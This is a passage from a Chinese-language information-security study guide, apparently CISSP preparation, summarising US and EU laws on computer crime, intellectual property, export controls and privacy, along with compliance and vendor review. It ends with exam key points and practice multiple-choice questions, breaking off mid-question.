1996年，美国国会还通过了对计算机诈骗和滥用法案的一系列修正案，从而进一步扩展了其提供的保护范围，其中包括了下面这些新覆盖的领域：</p><ul><li>放宽了法案的范围，除了用于州间贸易的计算机系统，还包括用于国际贸易的计算机系统。</li><li>扩展了对国家基础设施(除了计算系统外还有铁路、燃气管道、电网和通信线路)的类似保护。</li><li>对于故意的或不计后果的造成国家基础设施重要部分损坏的行为，作为重罪处理。</li></ul><h5 id="6-文书精简法案-1995年"><a href="#6-文书精简法案-1995年" class="headerlink" title="6. 文书精简法案(1995年)"></a>6. 文书精简法案(1995年)</h5><p>　　文书精简法案(1995年)要求机构在请求大多数类型的公共信息之前，必须获得美国行政管理和预算局(Office ofManagement and Budget，OMB)的批准。信息收集包括表格、会谈、记录保存要求以及其他各种行为。</p><h5 id="7-政府信息安全改革法案-2000年"><a href="#7-政府信息安全改革法案-2000年" class="headerlink" title="7. 政府信息安全改革法案(2000年)"></a>7. 政府信息安全改革法案(2000年)</h5><p>　　2000年的美国政府信息安全改革法案(GISA)修正了美国法典，从而实施了额外的信息安全策略和措施。在该法案的文本中，美国国会为建立GISRA设置了下列5个基本目标：</p><ul><li>提供内容全面的体制，从而建立和确保控制那些支持联邦工作和资产的信息资源的有效性。</li><li>认识到联邦计算环境高度网络化的特点，其中包括联邦政府协同工作能力的需要以及改善的安全管理措施的实现，从而保证协同工作的能力不会受到负面影响。</li><li>提供有效的政府范围内的管理以及监督与安全风险相关的信息，包括贯穿所有市民、国家安全和执法社区的信息安全工作。</li><li>为保护联邦信息和信息系统安全所需的最小控制措施提供开发和维护。</li><li>为联邦机构信息安全程序的监督措施的改进提供机制。</li></ul><p>GISRA还创建了一种新的计算机系统类别。关键任务系统满足下面的标准之一：</p><ul><li>被其他法律条款定义为国家安全系统。</li><li>由为机密信息而建立的措施保护。</li><li>对所处理的信息发生丢失、误用、泄露或未经授权的访问，或者对所处理的信息的任何修改都会对机构的任务产生不良影响。</li></ul><h5 id="8-美国联邦信息安全管理法案"><a href="#8-美国联邦信息安全管理法案" class="headerlink" title="8. 美国联邦信息安全管理法案"></a>8. 美国联邦信息安全管理法案</h5><p>　　在2002年通过的美国联邦信息安全管理法案(Federal Information Security Management Act，FISMA)要求联邦机构实施一个信息安全项目，这个项目要覆盖机构部门的运营。FISMA 同样也要求政府部门，包括承包商在内的活动在安全管理项目内。美国国家标准技术研究所(NIST)负责开发FISMA实施指南，概括了下面的关于一个有效信息安全项目的要素：</p><ul><li>定期评估风险，包括可能由未授权的访问、使用、信息披露、破坏、修改，或由信息破坏和支撑着组织运营的系统以及组织的资产导致的伤害，将它们降低到最小。</li><li>基于风险评估的策略和程序，在成本效益原则下把信息安全风险降低到一个可接受的级别，以及确保信息安全贯穿于组织每个信息系统的整个生命周期中。</li><li>下级计划为网络、设施、信息系统或信息系统群体提供恰当的信息安全。</li><li>通过安全意识培训去告知每个人(包括承包商和其他支撑着组织运营和资产的信息系统用户)，信息安全风险关系到他们的活动和责任，要遵守为了降低这些风险由组织设计的策略和程序。</li><li>定期测试和评估信息安全策略、程序、实践和安全控制的有效性，执行频率取决于风险，但每年至少一次。</li><li>规划、实施、评估和记录补救措施的过程，去解决信息安全策略、程序和组织实践中任何不足的地方。</li><li>制定对信息安全事件检测、报告和响应的流程。</li><li>制定计划和程序来确保支撑着组织运营和资产的信息系统的持续运行。</li></ul><h4 id="4-2-2-知识产权"><a href="#4-2-2-知识产权" class="headerlink" title="4.2.2 知识产权"></a>4.2.2 知识产权</h4><p>　　我们将介绍与4 种主要知识产权类型(版权、商标权、专利权和商业秘密)相关的法律，并且还将讨论这些概念如何与信息安全专家相关联。许多国家以不同的方式保护(或不予以保护)这些权力，但是基本的概念在世界各地大体相同。</p><h5 id="1-版权和数字干禧年版权法案"><a href="#1-版权和数字干禧年版权法案" class="headerlink" title="1. 版权和数字干禧年版权法案"></a>1. 版权和数字干禧年版权法案</h5><p>　　版权法保护”原创作品”的创作者，防止创作者的作品遭到未经授权的复制。目前有下列8种主要的作品类别受到版权保护：</p><ul><li>文学作品</li><li>音乐作品</li><li>戏剧作品</li><li>哑剧和舞蹈作品</li><li>绘画、图形和雕刻作品</li><li>电影和其他音像作品</li><li>声音录音</li><li>建筑作品</li></ul><p>　　软件版权属于文学作品这一类。版权法只保护计算机软件中内在的表达方式，也就是实际的源代码，不保护软件背后的思想或过程。目前有一个正规的过程可以获得版权，将受到保护的作品连同注册费用一起送到美国国会图书馆。然而，注意到下面这一点很重要：正式登记版权不是实施版权的先决条件。实际上，法律规定作品的创作者从作品产生出来起就立即自动享有版权。如果能在法院证明你就是作品的创作者(也可能是发行者)，那么你就会受到版权法的保护。正式注册只是让政府承认他们在具体的日期收到了你的作品。<br>　　版权的所有权总是属于作品的创作者。这个政策的特例是：作品是租用的。员工在日常工作期间生产出的作品被认为是”租用的”。目前的版权法提供了一个相当长的保护时间。有一位或多位创作者的作品，被保护的时间是直到最后一位创作者死后70年。租用的作品和匿名作品被保护的时间是以下两项中时间较短者： 从第一次发表日期起的95年，或从创作日期起的120年。<br>　　在1998年，美国国会认识到迅速变化的数字技术正在延伸至现行的版权法。为了迎接这个挑战，他们制定了引起广泛讨论的数字干禧年版权法案(Digital Millennium Copyright Act，DMCA)。DMCA还被用于使美国的版权法符合世界知识产权组织仰Orld Intellectual Property Organization，WIPO)条约中的两个条款。DMCA 的第一个主要条款是阻止那些挫败版权保护机制的企图，这些保护机制由版权所有者用于受保护的作品。这个条款被设计用于保护阻止复制数字介质的机制，如CD和DVD。 DMCA对重复罪行规定了高达100万美元和10年监禁的处罚。非营利性机构(如图书馆和学校)被从这个条款中免除。<br>　　DMCA还限制了当网络服务提供商的线路被罪犯用来违反版权法时应当承担的责任。DMCA认识到，ISP的法律地位与电话公司”普通运营商”的地位类似，并且对于他们的用户的暂时性行为不承担责任。为了符合免除条件的资格，服务提供商的活动必须符合下列各项要求：</p><ul><li>传输必须由提供商之外的某个人发起。</li><li>传输、路由、连接准备或复制必须由自动化的技术过程执行，而不是由服务提供商进行选择。</li><li>服务提供商不能决定数据的接收者。</li><li>任何中间的复制品除了预期的接收者以外，不能让任何人民问，并且保留的时间不能超过合理的需要时间。</li><li>不能修改所传输数据的内容。</li></ul><p>　　DMCA还免除了服务提供商有关系统缓存、搜索引擎和个人用户在网络上存储信息的活动。然而，在这些情况中，服务提供商必须采取迅速的行动，在接到侵权通知之时删除受版权保护的内容。<br>　　美国国会在DMCA中还包括了这样的条款，允许备份计算机软件和维护、测试或需要复制软件的日常活动。这些条款只应用于经过许可的在特定计算机上使用的软件，用法要符合许可证协议，并且这些复制品在不再需要允许的活动时必须被立刻删除。<br>　　最后，DMCA清楚地说明了版权法原则在新兴的Web广播领域中的应用。所谓Web广播，即通过互联网以广播形式，将音频或视频内容传送给接收者。这种技术通常被称为流式音频或流式视频。DMCA声明，这些使用被认为是”合法的非预定传输”。</p><h5 id="2-商标"><a href="#2-商标" class="headerlink" title="2. 商标"></a>2. 商标</h5><p>　　版权法被用来保护创造性的作品，对于商标也有保护。商标是单词、口号和标志语，被用于标识某家公司及其产品或服务。保护商标的主要目的是在保护个人和组织的知识产权时避免市场发生混乱。与版权的保护一样，为了获得法律的保护，商标不需要正式注册。<br>　　商标注册的一个主要好处是： 可以注册一个想要使用的商标，但不必是己经使用的商标。这种类型的应用被称为”使用意向(intent to use)”，并且从提供文档的申请之日起保护商标权(假定在特定期限内将商标真正投入商用)。如果选择不向PTO注册商标，那么保护从第一次使用商标时开始。在美国，接受商标应用主要有下列两个要求：</p><ul><li>该商标不能与其他商标类似，以免造成混淆。这需要在律师尽职搜索期间予以确定。在该商标的开放接受反对意见期间，其他公司可以对应用的商标提出质疑。</li><li>该商标不应该对所提供的产品和服务加以描述。例如，” Mike’s Software Company” 就不是一个好的商标候选名称，因为它描述了该公司生产的产品。如果USPTO 认为该商标具有描述性，就可能拒绝它的应用。</li></ul><p>　　在美国，商标准许的初始期是10年，年限到了可以再连续不受限制地使用10年。</p><h5 id="3-专利权"><a href="#3-专利权" class="headerlink" title="3. 专利权"></a>3. 专利权</h5><p>　　专利权是保护发明者的知识产权。他们提供20 年的保护，在这期间发明者具有独家使用发明的权力(无论是直接使用还是通过许可协议) 。在专利专用期结束时，该发明在公共领域允许任何人使用。<br>专利权有下列三个主要的要求：</p><ul><li>该发明必须是新的。只有在发明是原始创意时，才能申请专利。</li><li>该发明必须是有用的。它必须能够实际工作并完成某种类型的任务。</li><li>该发明不能是显而易见的。例如，你不能为你的主意(即使用喝水的杯子收集一杯雨水)而获得专利权。然而，你可以设计一个特殊的杯子，能优化收集到的雨水，并且将蒸发量减到最少，这个解决方案就可以获得专利。</li></ul><h5 id="4-商业秘密"><a href="#4-商业秘密" class="headerlink" title="4. 商业秘密"></a>4. 商业秘密</h5><p>　　很多公司都有知识产权，这对于他们的业务绝对关键，并且如果泄露给竞争对手或公开，都会会导致相当大的损害，这也就是商业秘密。前面讨论的版权和专利这两种知识产权工具可能被用于保护这种信息类型，但是却具有下列两个主要缺点：</p><ul><li>提出版权或专利应用申请时，要求公开地透露你的工作或发明的细节。这自动去除了产权的”秘密”特性，并且可能由于去除了产品的神秘或者允许不择手段的竞争对手违反国际知识产权法拷贝你的产权而对公司造成伤害。</li><li>版权和专利都提供有限时间的保护。一旦合法保护过期，那么其他公司就可以随意使用你的工作成果(并且他们拥有在申请过程中公开透露的所有细节)。</li></ul><p>　　官方关于商业秘密的处理过程实际上没有那么多，就它们的本质而言，不必向任何人登记，而是自己保持秘密。为了保持秘密，必须对企业实施适当的控制，确保只有经授权的需要了解这些秘密的人才可以访问这些秘密。还必须确保任何具有这类访问能力的人遵守不泄漏协议(NonDisclosureAgr民ment，NDA)以防止与他人共享，并且对违背协议的行为进行处罚。</p><h5 id="5-许可证"><a href="#5-许可证" class="headerlink" title="5. 许可证"></a>5. 许可证</h5><p>　　安全专家还应当熟悉软件许可证颁发协议的相关法律问题。许可证具有下列4种类型：</p><ul><li>合同许可证协议在软件商和用户之间采用书面的合同概述双方的责任。这些协议常见于高价的和/或特别专用的软件包。</li><li>收缩性薄膜包装的许可证协议是写在软件包装外面的协议。由于常常规定撕开封装软件包的收缩薄膜包装就承认了合同条款，因而得名。</li><li>单击包装许可证协议比收缩性薄膜包装协议更普遍。在这种协议类型中，合同条款或者写在软件包装盒外，或者包括在软件文档中。在安装过程中，你被要求单击一个按钮，表示己经阅读了协议条款并且同意遵守这些条款。这为协议的认同过程增添了积极的认可，确保使用者在安装之前知道协议的存在。</li><li>云服务许可协议让单击协议走向了极端。大部分云服务不需要任何形式的书面协议，而是在屏幕上简单闪现法律条款供检阅。在一些情况下，它们也许简单地为用户提供一个到法律条款的链接，以及一个确认己经阅读并同意条款的确认框。对于兴奋地访问一个新服务的大部分用户，他们不阅读协议就简单单击通过，这可能无意中使他们的整个组织负有法律责任的条款和条件。</li></ul><h4 id="4-2-3-进口-出口"><a href="#4-2-3-进口-出口" class="headerlink" title="4.2.3 进口/出口"></a>4.2.3 进口/出口</h4><p>　　美国联邦政府认识到，驱动互联网和电子商务发展的、非常类似的计算机和加密技术，还可能成为军用的强大工具。因此，在冷战期间，美国政府出台了一套复杂的规定，以便控制向其他国家出口敏感的硬件和软件产品。规定包括新技术、知识产权和个人身份信息的跨境数据流管理。直到最近，除了一些选择的盟国之外，向美国以外国家或地区出口强大能力的计算机还是很难的事情。对于加密软件的出口控制甚至更严，实质上向美国以外国家或地区出口加密技术是不可能的。最近美国联邦策略的一些改变已经放松了这些限制，从而提供更加开放的商业环境。</p><h5 id="1-计算机出口控制"><a href="#1-计算机出口控制" class="headerlink" title="1. 计算机出口控制"></a>1. 计算机出口控制</h5><p>　　当前，美国公司可能将高性能的计算机系统出口到事实上没有受到美国政府事先许可的一些国家。如果某些国家被美国商务部的工业和安全局认为，它们构成核扩散问题、支持恐怖主义或与此相关，那么对这些国家来说这条”规则”就是例外的。</p><h5 id="2-加密产品出口控制"><a href="#2-加密产品出口控制" class="headerlink" title="2. 加密产品出口控制"></a>2. 加密产品出口控制</h5><p>　　美国商务部的工业和安全局对向美国以外的国家出口加密产品建立了又一个规定。在前面的规定中，事实上即使向美国以外的国家出口相对低等级的加密技术也是不可能的。这使得美国的软件制造商与没有这些限制的外国公司相比，具有很大的竞争劣势。在经过软件企业的长期游说之后，美国总统指示美国商务部修订其规定，以促进美国安全软件业的成长。<br>　　现在的规定定义了安全软件的零售种类和大规模市场销售。现在这些规则准许公司提交这些产品，由美国商务部进行复审，但是复审将不会超过30 天，在复审成功地完成后，这些公司就可以自由地出口这些产品。</p><h4 id="4-2-4-隐私"><a href="#4-2-4-隐私" class="headerlink" title="4.2.4 隐私"></a>4.2.4 隐私</h4><p>　　在美国，隐私权己经成为多年来争论的热门问题。争论的主要问题是宪法的权利法案没有明确规定隐私权。然而，很多法院都已经支持这个权力，并且像美国公民自由协会(American Civil LibertiesUnion，ACLU)这样的组织也在积极地追求这个权力。欧洲人同样一直在关注他们的隐私。实际上，像瑞士这样的国家由于其保护财务秘密的能力己为世界所知。</p><h5 id="1-美国隐私法"><a href="#1-美国隐私法" class="headerlink" title="1.美国隐私法"></a>1.美国隐私法</h5><ul><li><strong>第四修正案</strong> 隐私权的基础是美国宪法的第四修正案，内容如下所示：人们保护其人身、房屋、证件和财物不受无理搜查和没收的权利不应当被违反，并且这些违反行为不应得到投权批准，但是那些可能性很大的原因、受到誓词或证词支持的、特别描述的需要搜查的地方和需要被逮捕或扣押的人或物品除外。这个修正案的直接解释防止了美国政府机构在缺乏授权批准和可能性很大的原因的情况下对私有财产进行搜查。一些美国法院己经扩展了其对第四修正案的解释，包括针对窃听和侵犯其他隐私的防护。</li><li><strong>隐私法案(1974年)</strong> 美国的隐私法案(1974年)可能是对美国联邦政府处理公民个人私有信息的方法进行限制的最重大的隐私立法，它严格地限制了美国联邦政府机构在没有事先得到当事人书面同意的情况下向他人或其他机构泄漏隐私信息的能力。这个法案还规定了一些例外，涉及人口普查、执法、国家档案、健康和安全以及法院判决。隐私法案要求政府机构只维护那些对于管理其业务必要的记录，并且在政府的合法职能不再需要时销毁这些记录。它为个人对这些政府维护的记录进行访问并要求修正不正确的记录规定了正式的程序。</li><li><strong>电子通信隐私法案(1986年)</strong> 电子通信隐私法案(Electronic Communication Privacy Act，ECPA)使得对个人电子隐私的侵犯成为犯罪行为。这个法案更新了联邦窃听法案，以便应用于非法的电子(也就是计算机)通信侦昕或者对于以电子形式存储的数据的有意和未授权访问。ECPA禁止侦昕或泄漏电子通信，并且定义了公开电子通信的合法情况。该法案对电子邮件和语音邮件通信的监视提供了防护，并且防止这些服务的提供商对这些内容进行未授权的公开。</li><li><strong>执法通信协助法案(1994年)</strong> 执法通信协助法案(Communication Assistance for Law Enforcement Act，CALEA)是对1986年的电子通信隐私法案的修正。CALEA要求：无论采用怎样的技术，所有通信运营商都需要允许持有适当法院判决的执法人员进行窃听。</li><li><strong>经济和专有信息保护法案(1996年)</strong> 经济和专有信息保护法案将财产的定义扩展为包括经济信息，从而可以将窃取这类信息的行为视作针对行业或公司的间谍行为。这个法案修改了盗窃的法律定义，从而使这种行为不再受到物理约束。</li><li><strong>健康保险流通与责任法案(1996 年)</strong> 1996年，美国国会通过了健康保险流通与责任法案(Health Insurance Portability and Accountability Act，HIPAA) ，这使得管理健康保险和健康保护组织(Health Maintenance Organization，HMO)的法律发生了许多变化。在回PAA 的条款中，隐私和安全法规要求医院、医师、保险公司和其他处理或存储个人医疗隐私信息的组织采取严格的安全措施。HIPAA 还明确地定义了个人在医疗记录方面的权利，并且要求保存医疗记录的组织书面表明这些权利。</li><li><strong>2009关于经济和临床健康的卫生信息技术法案</strong> 在2009年，美国国会通过了”关于经济和临床健康的卫生信息技术法案(Health Infomation Technology for Economic and Clinical Health，HITECH)”来修订HIPAA。这条法律更新了许多HIPAA的隐私和安全需求，并于2013 年通过HIPAA Omnibus Rule实施。被新法规强制变化的其中之一就是在法律对待商业伙伴(Business Associate，BA)的方式上，处理被保护的健康信息(protected Health Information，PHI)的组织机构代表了HIPAA覆盖的实体。覆盖实体和一个BA 之间的任何关系必须被书面合同管理，这个合同被称为业务联合协议。HITECH也引入了新的数据泄露通告需求。在HITECH违约通知规则下，经历了数据泄露的HIPAA覆盖实体必须通知受影响的个人，当泄露影响超过500人时，必须通知卫生和人力服务部的部长和媒体。</li><li><strong>儿童联机隐私保护法案(1998年)</strong> 2000年4月，儿童联机隐私保护法案(CHildren’s Online Privacy Protection Act，COPPA)中的规定成为美国本土的法律。COPPA对关心孩子或有意收集孩子的信息的网站提出了一系列要求：<ul><li>网站必须发送隐私通知，清楚地说明他们所收集信息的类型和用途，包括是否有一些信息会泄漏给第三方。隐私通知还必须包括网站工作者的联系信息。</li><li>必须向父母提供机会，复查任何从他们的孩子那里收集到的信息，并且可以从网站的记录中永久地删除这些信息。</li><li>如果孩子的年龄小于13岁，那么在收集信息前，父母必须对有关孩子信息的收集做出可证实的允许。法律中存在一些例外，准许Web站点只是为了获得父母允许收集最少的信息。</li></ul></li><li><strong>Gramm-Leach-Bliley法案(1999年)</strong> 直到Gramm-Leach-Bliley Act(GLBA)法案于1999年成为法律，在商业机构之间才形成了严格的政府屏障。银行、保险公司和贷款提供商受到对他们所能提供的服务和相互共享的信息的严格限制。GLBA 稍微放松了涉及每个组织所能提供的服务的规定。当美国国会通过了这条法案后，它意识到这扩大了具有深远隐私意义的范围。基于这点考虑，该法案包括了许多限制，对可能在相同公司的子公司之间交换的信息类型进行了限制，并且要求从2001年7月1日开始金融机构对所有用户提供书面的隐私策略。</li><li><strong>美国爱国者法案(2001年)</strong> 美国国会对2001年9月11日发生在纽约市和华盛顿哥伦比亚特区的9.11恐怖袭击做出了直接反应：通过了提供拦截和阻止恐怖行为所需的适当工具来团结和巩固美国(USA PATRIOT)法案。美国爱国者法案大大扩大了执法机构和情报机构跨多个领域的力量，包括对电子通信的监视。美国爱国者法案提出的一个主要改变涉及政府机构获取窃听授权的方法。以前，策略只能一次获取一条线路的授权(在证实这条线路被受到监控的某人使用后)。美国爱国者法案规定准许官方获得对个人的一揽子授权，并且随后根据这项单一授权监视此人的所有通信。另一个主要的改变是政府处理网络服务提供商(ISP)的方式。根据美国爱国者法案中的条款，ISP可以自愿地向政府提供大范围的信息。美国爱国者法案还准许政府通过使用传唤获取用户活动的详细信息(与窃听相反)。最后，美国爱国者法案修正了计算机欺诈和滥用法案(是另一组修正案)，从而对犯罪行为处以更严厉的处罚。美国爱国者法案规定了最长20年的监禁条款，并再一次扩大了CFAA的范围。</li><li><strong>子女教育权利和隐私法案</strong> 子女教育权利和隐私法案(Family Educational Rights and Privacy Act，FERPA)是另一种特殊的隐私法案，它影响所有接受美国联邦政府资助的教育机构(绝大多数学校)。这个法案赋予18岁以上的学生和未成年学生父母的确定的隐私权。具体的FERPA 保护包括下列内容：<ul><li>父母/学生具有检查由教育机构保存的此学生教育记录的权利。</li><li>父母/学生具有要求改正他们认为不正确的记录的权利，具有在记录中包括声明争辩任何没有被改正的内容的权利。</li><li>学校不能不经书面许可而发放学生记录的个人信息，某些特定的情况除外。</li></ul></li><li><strong>身份偷窃和冒用阻止法案(1998年)</strong> 1998年，美国总统签署了身份偷窃和冒用阻止法案，从而使之成为法律。在过去，只有身份偷窃的合法受害人才是受侵害的债权人。这个法案使得身份偷窃成为对被偷窃身份的个人犯罪行为，并且规定了对任何违反此法律的人处以严厉的犯罪处罚(长达15年的监禁条款和250000美元的罚款)。</li></ul><h5 id="2-欧盟隐私法"><a href="#2-欧盟隐私法" class="headerlink" title="2.欧盟隐私法"></a>2.欧盟隐私法</h5><p>　　1995年10月24日，欧盟(European Union，EU)议会通过了描绘隐私措施的概括指令，也就是必须采取措施保护信息系统中处理的个人数据。这个指令在3年后(1998年10月)生效。指令要求所有个人数据的处理都要满足下列标准中的某一条：</p><ul><li>同意</li><li>合同</li><li>法律义务</li><li>数据主体的主要利益</li><li>数据所有者和数据主体之间利益的平衡</li></ul><p>　　如下所示，指令还描述了有关数据被持有和处理的个人的重要权利：</p><ul><li>访问数据的权利</li><li>知道数据源的权利</li><li>改正错误数据的权利</li><li>拒绝在某些情况下处理数据的权利</li><li>这些权利被违反时应当采取的合法行为</li></ul><p>　　甚至欧洲以外的组织，根据跨境数据流的要求，必须考虑这些规则的适用性。为防止欧盟公民的个人信息从欧盟泄露出去，这些发送的数据必须确保是受到保护的。在欧洲从事商业活动的美国公司可以根据欧盟和美国之间的谈判获得保护，该谈判准许美国商务部证明业务遵守规定，并且为他们提供”安全避难所”，以免于受到起诉。为了符合安全避难所规定，在欧洲进行商业活动的美国公司必须满足下列7 项处理个人信息的要求：</p><ul><li><strong>通知</strong> 他们必须通知个人收集了什么信息，以及信息将如何使用。</li><li><strong>选择</strong> 如果信息将被用于其他目的或与第三方共享，那么他们必须准许个人决定退出。对于涉及敏感的信息，必须采取决定参加的策略。</li><li><strong>向前传递</strong> 企业只可能与其他遵守安全避难所原则的企业共享数据。</li><li><strong>访问</strong> 个人必须被授权访问任何包含其个人信息的数据。</li><li><strong>安全</strong> 必须采取适当的机制保护数据，以防止丢失、监用和未授权的公开。</li><li><strong>数据完整性</strong> 企业必须采取措施，确保他们所维护信息的可靠性。</li><li><strong>实施</strong> 企业必须为个人提供争论解决办法，向管理机构提供证明，表明遵守安全避难所规定。</li></ul><h3 id="4-3-合规性"><a href="#4-3-合规性" class="headerlink" title="4.3 合规性"></a>4.3 合规性</h3><p>　　在过去的10年间，信息安全管理的监管环境变得越来越复杂。组织可能会发现自己受到广泛的各种各样的法律约束，以及来自监管机构或合同义务的强制合规。组织在面对和处理许多的交叉和有时相互矛盾的合规需求时，需要仔细计划。许多组织雇佣全职的盯合规人员负责跟踪合规环境，监督控制以确保持续合规，促进合规性审核，并满足该组织的合规性报告责任。<br>　　组织可能会经受合规性审计，要么通过标准内部或外部审计机构，要么通过监管或其代理。例如，组织的财务审计人员也许主导IT 控制审计，这种审计被设计用于确保组织金融系统的信息安全控制满足萨班斯·奥克斯利法案的要求。除了正式的审计，组织必须经常把合规遵从报告发送给内部或外部的股东。例如，组织的董事会(或者，更多是董事会的审计委员会)可能需要定期的合规义务和状况的报告。</p><h3 id="4-4-合同与采购"><a href="#4-4-合同与采购" class="headerlink" title="4.4 合同与采购"></a>4.4 合同与采购</h3><p>　　使用云服务和其他外部供应商来存储、处理和传输敏感信息的用户逐渐增加，这导致一些组织在他们的合同签订和采购过程中，实施安全审查和控制成为一个新的关注点。安全专家应该主导对供应商部署的安全控制措施进行审查，这包括最初的供应商选择和评估流程，以及作为供应商持续管理过程的一部分。供应商管理审查中覆盖的一些问题包括：</p><ul><li>什么类型的敏感信息应该由供应商存储、处理或发送?</li><li>在部署保护组织信息时有什么样的控制措施?</li><li>组织的信息如何与其他客户的信息分开?</li><li>如果加密是一种值得信赖的安全控制措施，那么我们要用什么样的加密算法和密钥长度?密钥管理如何进行?</li><li>供应商执行了什么类型的安全审计? 客户访问这些审计必须做什么?</li><li>供应商是否依赖于任何其他第三方来存储、处理或传输数据? 如何处理扩展到第三方与安全有关的合同条款?</li><li>数据存储、处理和传输发生在什么地方? 如果客户或供应商在国外，会有什么影响?</li><li>供应商的事件响应流程是什么? 什么时候将会通知客户存在潜在安全泄露?</li><li>在确保客户数据的持续完整性和可用性方面有什么条款?</li></ul><h3 id="4-5-考试要点"><a href="#4-5-考试要点" class="headerlink" title="4.5 考试要点"></a>4.5 考试要点</h3><ul><li><strong>了解刑法、民法和行政法之间的差别</strong> 刑法保护社会免遭那些违反我们信奉的基本原则的行为。违反刑法的行为是由美国联邦和州政府进行起诉的。民法提供了个人和组织之间的商业交易体制。违反民法的行为被提交法院并由受到影响的双方进行辩论。行政法是由政府机构使用的，目的是为了有效地执行日常事务。</li><li><strong>能够解释用来保护社会免遭计算机犯罪影响的主要法律的基本条款</strong> 计算机诈骗和滥用法案(修正案)保护政府或州间贸易使用的计算机不被滥用。计算机安全法案概括了政府为了保护自己的系统免遭攻击而必须采取的措施。政府信息安全改革法案进一步发展了美国联邦政府信息安全程序。</li><li><strong>了解版权、商标、专利权和商业秘密之间的差别</strong> 版权保护创作者的原创作品，如书籍、文章、诗和歌曲。商标是名称、口号和徽标，用于杭只公司、产品或服务。专利权为新发明的创作者提供保护。商业秘密法律保护公司的运营机密。</li><li><strong>能够解释数字干禧年版权法案(1998年)的基本条款</strong> 数字千禧年版权法案禁止绕过针对数字介质的复制保护机制，并限制网络服务提供商对于其用户行为的责任。</li><li><strong>了解经济间谍法案(1996年)的基本规定</strong> 经济间谍法案对任何被发现偷盗商业秘密的人进行处罚。在盗窃者知道这些信息将为外国政府获利时，他会被处以严厉的处罚。</li><li><strong>理解不同类型的软件许可证协议</strong> 合同许可证协议是软件商和用户之间采用的书面协议。收缩性薄膜包装协议写在软件包装上，并且在用户打开包装时生效。单击包装协议包括在包装中，但是需要用户在软件安装过程中接受这些条款。</li><li><strong>解释关于软件许可证颁发的统一计算机信息剑主里法案</strong> 统一计算机信息处理法案提供了由美国联邦和州政府强制执行的收缩性薄膜包装和单击包装协议的架构。</li><li><strong>理解一个经历数据破坏的组织的通告要求</strong> 加利福尼亚外版布的SB 1386是第一个在全州范围内要求通告个人信息被泄漏到当事人的法律。美国目前除了三个州以外的其他外州都最终审议通过了相似的法律。目前，只有当涉及HIPPA覆盖的实体破坏了它们保护的健康信息时，联邦法律才要求需要通知个人。</li><li><strong>理解在美国和欧盟管理个人信息隐私的主要法律</strong> 美国有很多影响政府对信息的使用以及控制涉及敏感信息的具体行业(如金融服务公司和卫生健康组织)对信息使用的隐私法律。欧盟对数据隐私有着更加广泛的法令，以管理个人信息的使用和交换。</li><li><strong>了解法庭上可接纳的证据的基本要求</strong> 要被接纳，证据就必须与本案发生的事实相关，事实必须对本案是必要的，并且证据必须有法定资格或是合法收集的。</li><li><strong>了解怎么把安全整合到采购和供应商管理流程中</strong> 被许多组织大量使用的云服务，就要求更加注意在供应商选择过程中，以及作为供应商持续管理的一部分，引导信息安全控制的审查。</li></ul><h3 id="4-6-复习题"><a href="#4-6-复习题" class="headerlink" title="4.6 复习题"></a>4.6 复习题</h3><ol><li><p>对于病毒、密码和其他类型的破坏计算机系统的恶意代码的编写者，下列哪个刑法是第一个去执行惩罚的?<br>A. 计算机安全法案<br>B. 国家基础设施保护法案<br>C. 计算机欺诈和滥用法案<br>D. 电子传输隐私法案</p></li><li><p>哪条法律首先要求美国联邦的相关计算机系统操作者接受计算机安全问题的定期培训?<br>A. 计算机安全法案<br>B. 国家基础设施保护法案<br>C. 计算机欺诈和滥用法案<br>D. 电子通信隐私法案</p></li><li><p>什么类型的法律并不要求国会的法案在联邦一级执行，而是由行政部门以法规、政策和程序的形式颁布?<br>A. 刑法<br>B. 普通法<br>C. 民法<br>D. 行政法</p></li><li><p>哪个联邦政府机构有安全责任确保政府计算机系统没有用于处理敏感和分类信息?<br>A. 美国国家安全局<br>B. 联邦调查局<br>C. 国家标准和技术协会<br>D. 联邦情报局</p></li><li><p>什么是计算机系统最广泛的类别，这个类别受计算机欺诈和滥用方案(修正案)保护?<br>A. 政府所属系统<br>B. 联邦相关系统<br>C. 用于洲际贸易的系统<br>D. 美国境内系统</p></li><li><p>在设置对获得政府部门授权的监管部门搜查私人住宅和设施的权利限制方面，什么法律保护了公民的隐私权?<br>A. 隐私法案<br>B. 第四修正案<br>C. 第二修正案<br>D. Grarnm-Leach-Bliley法案</p></li><li><p>Matthew最近编写了一个创新的算法去解决一个数学问题，并且他希望与全世界分享。但是，在技术杂志上发布软件代码之前，他想获得一些知识产权方面的保护。下列哪个保护最适合他?<br>A. 版权<br>B. 商标<br>C. 专利<br>D. 商业秘密</p></li><li><p>Mary 是一家制造企业Acme Widgets的联合创始人。与合伙人Joe一起，她开发了一个特种油，能显著提高小部件的生产过程。为了保证配方的机密性，Mary和Joe计划在其他工人离开后，由他们自己在厂房里大量生产这种油。他们想尽可能保护这个配方。下列哪个知识产权保护最适合他们?<br>A. 版权<br>B. 商标<br>C. 专利<br>D. 商业秘密</p></li><li><p>Richard近期为计划即将开始使用的新产品起了一个不错的名字。他与律师商量并填写相应的申请去保护他的产品名字，但是仍未从政府收到关于他的申请的回应。他想立即开始使用名字。他应该使用什么样的符号来表明他的产品名字处于受保护的状态?<br>A. ©<br>B. ®<br>C. ™<br>D. t</p></li><li><p>什么法律禁止政府机构泄露个人提交给政府保护环境下的信息?<br>A. 隐私法案<br>B. 电子通信隐私法案<br>C. 健康保险流通与责任法案<br>D. Gramm-Leach-Bliley法案</p></li><li><p>软件行业使用什么法律来正式地派发大量许可，并试着标准化从一个州到另一个州的使用?<br>A. 计算机安全法案<br>B. 统一计算机信息处理法案<br>C. 数字千禧年版权法案<br>D. Gramm-Leach-B1i1ey法案</p></li><li><p>儿童联机隐私保护法案被设计用来保护在互联网上使用的儿童隐私。在企业可以从他们那里收集未经父母同意的个人身份信息之前，孩子的最小年龄是几岁?<br>A. 13<br>B. 14<br>C. 15<br>D. 16</p></li><li><p>为了获得数字千禧年版权法案的短暂活动条款的保护，下列哪些是互联网服务提供商不用满足的需求?<br>A. 服务提供商和消息的发起者必须处于不同的状态。<br>B. 传输、路由、连接的提供或复制必须由一个没有通过服务提供商选择的材料的自动化技术过程来进行。<br>C. 任何中间副本一般不得让预期外的任何收件人访问，并且不得保留超过合理必要的时间。<br>D. 传输必须由除供应商以外的人发起。</p></li><li><p>以下哪一个法律不是为了保护消费者和网民的隐私权?<br>A. 健康保险易流通与责任法案<br>B. 阻止盗用和伪装身份法案<br>C. 美国爱国者法案<br>D. 